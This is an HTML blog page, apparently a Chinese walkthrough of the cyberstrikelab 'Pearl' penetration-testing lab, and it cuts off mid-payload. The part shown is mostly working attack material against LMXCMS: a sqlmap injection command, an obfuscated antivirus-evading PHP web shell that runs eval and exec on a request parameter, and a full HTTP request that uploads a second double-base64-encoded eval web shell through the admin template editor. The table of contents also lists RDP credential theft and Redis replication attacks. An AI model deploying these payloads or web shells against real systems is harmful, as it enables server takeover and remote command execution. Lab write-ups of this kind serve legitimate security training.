@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="梦想cms sql注入 + 后台文件上传   1sqlmap.py -u &quot;[http:&#x2F;&#x2F;192.168.10.65&#x2F;?m&#x3D;Tags&amp;name&#x3D;&quot;](http:&#x2F;&#x2F;192.168.10.65&#x2F;?m&#x3D;Tags&amp;name&#x3D;&quot;) --technique&#x3D;E --tamper&#x3D;chardoubleencode -p name -D lmxcms --tabl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab-Pearl">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="梦想cms sql注入 + 后台文件上传   1sqlmap.py -u &quot;[http:&#x2F;&#x2F;192.168.10.65&#x2F;?m&#x3D;Tags&amp;name&#x3D;&quot;](http:&#x2F;&#x2F;192.168.10.65&#x2F;?m&#x3D;Tags&amp;name&#x3D;&quot;) --technique&#x3D;E --tamper&#x3D;chardoubleencode -p name -D lmxcms --tabl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601221926663.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601222326646.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601225000162.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601232501000.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234014102.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234210413.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234415898.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601235117400.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601235433719.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250602000148938.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250602003848832.png">
+<meta property="article:published_time" content="2025-06-01T14:18:16.000Z">
+<meta property="article:modified_time" content="2025-06-01T16:43:21.531Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="cyberstrikelab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601221926663.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>cyberstrikelab-Pearl</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Diamond/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/31/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Gear/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&text=cyberstrikelab-Pearl"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&is_video=false&description=cyberstrikelab-Pearl"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-Pearl&body=Check out this article: https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&name=cyberstrikelab-Pearl&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&t=cyberstrikelab-Pearl"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%A6%E6%83%B3cms-sql%E6%B3%A8%E5%85%A5-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">梦想cms sql注入 + 后台文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">RDP远程桌面密码凭证获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">Redis主从复制</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        cyberstrikelab-Pearl
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-01T14:18:16.000Z" class="dt-published" itemprop="datePublished">2025-06-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cyberstrikelab/" rel="tag">cyberstrikelab</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="梦想cms-sql注入-后台文件上传"><a href="#梦想cms-sql注入-后台文件上传" class="headerlink" title="梦想cms sql注入 + 后台文件上传"></a>梦想cms sql注入 + 后台文件上传</h2><img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601221926663.png" class="">
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;[http://192.168.10.65/?m=Tags&amp;name=&quot;</span>](http://<span class="number">192.168</span><span class="number">.10</span><span class="number">.65</span>/?m=Tags&amp;name=<span class="string">&quot;) --technique=E --tamper=chardoubleencode -p name -D lmxcms --tables</span></span><br></pre></td></tr></table></figure>
+
+<p>注入出来之后密码是一个弱口令 admin admin123</p>
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601222326646.png" class="">
+
+<p>修改为可以上传php文件,然后写一个免杀的木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义混淆函数m</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$a</span>), <span class="title function_ invoke__">str_split</span>(<span class="variable">$b</span>), <span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义字符串数组S，用来存储需要混淆的函数名</span></span><br><span class="line"><span class="variable">$S</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&quot;ncoai&quot;</span>, <span class="string">&quot;msyte&quot;</span>, <span class="string">&quot;cocain&quot;</span>), </span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&quot;sir&quot;</span>, <span class="string">&quot;cex&quot;</span>, <span class="string">&quot;iris&quot;</span>),</span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&quot;otab&quot;</span>, <span class="string">&quot;lshe&quot;</span>, <span class="string">&quot;taboo&quot;</span>) . <span class="string">&quot;_&quot;</span> . <span class="title function_ invoke__">m</span>(<span class="string">&quot;sir&quot;</span>, <span class="string">&quot;cex&quot;</span>, <span class="string">&quot;iris&quot;</span>),</span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&quot;gbledin&quot;</span>, <span class="string">&quot;upasthr&quot;</span>, <span class="string">&quot;bleeding&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取系统参数D</span></span><br><span class="line"><span class="variable">$TR</span> = <span class="title function_ invoke__">m</span>(<span class="string">&quot;etroubl&quot;</span>, <span class="string">&quot;edisabl&quot;</span>, <span class="string">&quot;trouble&quot;</span>);</span><br><span class="line"><span class="variable">$MK</span> = <span class="title function_ invoke__">m</span>(<span class="string">&quot;dpreambl&quot;</span>, <span class="string">&quot;sfunctio&quot;</span>, <span class="string">&quot;preambled&quot;</span>);</span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="variable">$TR</span> . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$MK</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取请求参数P</span></span><br><span class="line"><span class="variable">$P</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$S</span> <span class="keyword">as</span> <span class="variable">$A</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果数组S中的某个元素不在数组D中</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$A</span>, <span class="variable">$D</span>)) &#123;</span><br><span class="line">        <span class="comment">// 根据不同的条件，执行对应的操作</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$A</span> == <span class="title function_ invoke__">m</span>(<span class="string">&quot;ncoai&quot;</span>, <span class="string">&quot;msyte&quot;</span>, <span class="string">&quot;cocain&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 调用传递的命令</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$P</span>[<span class="string">&#x27;lol&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$P</span>[<span class="string">&#x27;lol&#x27;</span>]); <span class="comment">// 执行传入的PHP代码</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$A</span> == <span class="title function_ invoke__">m</span>(<span class="string">&quot;sir&quot;</span>, <span class="string">&quot;cex&quot;</span>, <span class="string">&quot;iris&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 执行命令并输出结果</span></span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$P</span>[<span class="string">&#x27;lol&#x27;</span>] . <span class="string">&quot; 2&gt;&amp;1&quot;</span>, <span class="variable">$arr</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$arr</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 默认处理</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$P</span>[<span class="string">&#x27;lol&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$P</span>[<span class="string">&#x27;lol&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行完毕后退出</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?m=Template&amp;a=editfile&amp;dir= HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">10.65</span></span><br><span class="line">Content-Length: <span class="number">8375</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Origin: http:<span class="comment">//192.168.10.65</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">137.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://192.168.10.65/admin.php?m=Template&amp;a=editfile&amp;dir=default/error.html</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=f5lufa5cvplm7povphb842p643</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">settemcontent=1&amp;filename=4.php&amp;temcontent=%3C%3Fphp+%2F*%3Cmeta+name%3D%222v2wd8%22+content%3D%22qa9y1S5k%22%3E*%2F%0D%0A%24password%3D%27UUdWMqa9y1S5kllqa9y1S5kXqa9y1S5kd29KRjlRVDFOVVcyTnRaRjBwT3c9PQ%3D%3D%27%3B%0D%0A%24username+%3D+get_meta_tags%28__FILE__%29%5B%24_GET%5B%27token%27%5D%5D%3B%0D%0Aheader%28%22ddddddd%3A%22.%24username%29%3B%0D%0A%24arr+%3D+apache_response_headers%28%29%3B%0D%0A%24template_source%3D%27%27%3B%0D%0Aforeach+%28%24arr+as+%24k+%3D%3E+%24v%29+%7B%0D%0A++++if+%28%24k%5B0%5D+%3D%3D+%27d%27+%26%26+%24k%5B5%5D+%3D%3D+%27d%27%29+%7B%0D%0A++++++++%24template_source+%3D+str_replace%28%24v%2C%27%27%2C%24password%29%3B%0D%0A++++%7D%7D%0D%0A%24template_source+%3D+base64_decode%28%24template_source%29%3B%0D%0A%24template_source+%3D+base64_decode%28%24template_source%29%3B%0D%0A%24key+%3D+%27template_source%27%3B%0D%0A%24aes_decode%5B1%5D%3D%24%24key%3B%0D%0A%40eval%28%24aes_decode%5B1%5D%29%3B%0D%0A%24yBoZ6A+%3D+%22PCFET0NUWVBFIGh0bWw%2BCjxodG1sPgoJPGhlYWQ%2BCgkJPG1ldGEgY2hhcnNldD0idXRmLTgiPgoJCTx0aXRsZT7mi6bmiKrpobXpnaI8L3RpdGxlPgoJCTxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI%2BCgkJCWJvZHl7CgkJCQl3aWR0aDogMTAwJTsKCQkJCXBhZGRpbmc6IDA7CgkJCQltYXJnaW46IDA7CgkJCX0KCQkJI21heHsKCQkJCXdpZHRoOiAxMDAlOwoJCQkJcGFkZGluZzogMDsKCQkJCW1hcmdpbjogMCBhdXRvOwoJCQl9CgkJCSN0b3B7CgkJCQl3aWR0aDogMTUwcHg7CgkJCQltYXJnaW46IDAgYXV0bzsKCQkJCXBhZGRpbmctdG9wOiA2MHB4OwoJCQl9CgkJCSN3YXJtewoJCQkJbWFyZ2luOiAyMHB4IDAgMTVweCAwOwoJCQkJZm9udC1zaXplOiAyNHB4OwoJCQkJY29sb3I6ICM2MDYyNjY7CgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7CgkJCX0KCQkJI3RpcHsKCQkJCXdpZHRoOiA4MDBweDsKCQkJCW1hcmdpbjogMCBhdXRvOwoJCQkJcGFkZGluZy10b3A6IDEwcHg7CgkJCQlwYWRkaW5nLWJvdHRvbTogMjBweDsKCQkJCWJvcmRlcjogI0RGREZERiBzb2xpZCAxcHg7CgkJCQlib3JkZXItcmFkaXVzOiA2cHg7CgkJCQljb2xvcjogIzgwODI4ODsKCQkJCWZvbnQtc2l6ZTogMTZweDsKCQkJfQoJCQlwewoJCQkJcGFkZGluZy1sZWZ0OiAyMDBweDsKCQkJfQoJCQkjZXhhbXBsZXsKCQkJCW1hcmdpbi1sZWZ0OiA1NXB4OwoJCQl9CgkJCSNib217CgkJCQl3aWR0aDogOTAwcHg7CgkJCQltYXJnaW46IDAgYXV0bzsKCQkJCW1hcmdpbi10b3A6IDVweDsKCQkJCWZvbnQtc2l6ZTogMTZweDsKCQkJfQoJCQkjbGVmdHsKCQkJCWZsb2F0OiBsZWZ0OwoJCQkJd2lkdGg6IDMwcHg7CgkJCQlwYWRkaW5nLWxlZnQ6IDE2MHB4OwoJCQkJbWFyZ2luLXRvcDogMTBweDsKCQkJfQoJCQkjcmlnaHR7CgkJCQlmbG9hdDogbGVmdDsKCQkJCW1hcmdpbi10b3A6IDEwcHg7CgkJCQltYXJnaW4tbGVmdDogOHB4OwoJCQkJY29sb3I6ICM4MDgyODg7CgkJCX0KCQkJaW5wdXR7CgkJCQl3aWR0aDogMTAwcHg7CgkJCQloZWlnaHQ6IDM1cHg7CgkJCQlib3JkZXI6ICNERkRGREYgc29saWQgMXB4OwoJCQkJYm9yZGVyLXJhZGl1czogNHB4OwoJCQkJbWFyZ2luLWxlZnQ6IDVweDsKCQkJCW91dGxpbmU6IG5vbmU7CgkJCX0KCQkJI2RldGFpbHsKCQkJCWJhY2tncm91bmQtY29sb3I6ICMyZWExZjg7CgkJCQljb2xvcjogI0ZGRkZGRjsKCQkJfQoJCQkjZmVlZGJhY2t7CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGOwoJCQkJY29sb3I6ICM4MDgyODg7CgkJCX0KCQkJZm9vdGVyewoJCQkJd2lkdGg6IDEwMCU7CgkJCQlwb3NpdGlvbjogYWJzb2x1dGU7CgkJCQlib3R0b206IDBweDsKCQkJCXBhZGRpbmc6IDI1cHggMCAzNXB4IDA7CgkJCQltYXJnaW46IDAgYXV0bzsKCQkJCXRleHQtYWxpZ246IGNlbnRlcjsKCQkJCWNvbG9yOiAjODA4Mjg4OwoJCQkJZm9udC1zaXplOiAxNHB4OwoJCQkJYm9yZGVyLXRvcDogMXB4IHNvbGlkICNlNGU3ZWQ7CgkJCX0KCQk8L3N0eWxlPgoJCQoJPC9oZWFkPgoJPGJvZHk%2BCgkJPGRpdiBpZD0ibWF4Ij4KCQkJPGRpdiBpZD0idG9wIj4KCQkJCTxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBpZD0i5Zu%2B5bGCXzEiIHN0eWxlPSIiIHZpZXdCb3g9IjAgMCA5MyA2MCIgeD0iMHB4IiB5PSIwcHgiIHhtbG5zOnhtbD0iaHR0cDovL3d3dy53My5vcmcvWE1MLzE5OTgvbmFtZXNwYWNlIiB4bWw6c3BhY2U9InByZXNlcnZlIiB2ZXJzaW9uPSIxLjEiPgoJCQkJPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCQkJCQkuc3Qwe2ZpbGw6IzI3QTFGRDt9CgkJCQkJLnN0MXtmaWxsOiM0NzQ3NTU7fQoJCQkJCS5zdDJ7ZmlsbDojRkZGRkZGO30KCQkJCQkuc3Qze2ZpbGw6IzcxQzFGRTt9CgkJCQk8L3N0eWxlPgoJCQkJPGc%2BCgkJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0iTSA3MyAxOCBIIDMxIGMgLTIuMiAwIC00IC0xLjggLTQgLTQgViA0IGMgMCAtMi4yIDEuOCAtNCA0IC00IGggNDIgYyAyLjIgMCA0IDEuOCA0IDQgdiAxMCBDIDc3IDE2LjIgNzUuMiAxOCA3MyAxOCBaIiAvPgoJCQkJCTxwYXRoIGNsYXNzPSJzdDEiIGQ9Ik0gMjEgMTggSCA0IGMgLTIuMiAwIC00IC0xLjggLTQgLTQgViA0IGMgMCAtMi4yIDEuOCAtNCA0IC00IGggMTcgYyAyLjIgMCA0IDEuOCA0IDQgdiAxMCBDIDI1IDE2LjIgMjMuMiAxOCAyMSAxOCBaIiAvPgoJCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0gNzMgNTggSCAzMSBjIC0yLjIgMCAtNCAtMS44IC00IC00IFYgNDQgYyAwIC0yLjIgMS44IC00IDQgLTQgaCA0MiBjIDIuMiAwIDQgMS44IDQgNCB2IDEwIEMgNzcgNTYuMiA3NS4yIDU4IDczIDU4IFoiIC8%2BCgkJCQkJPHBhd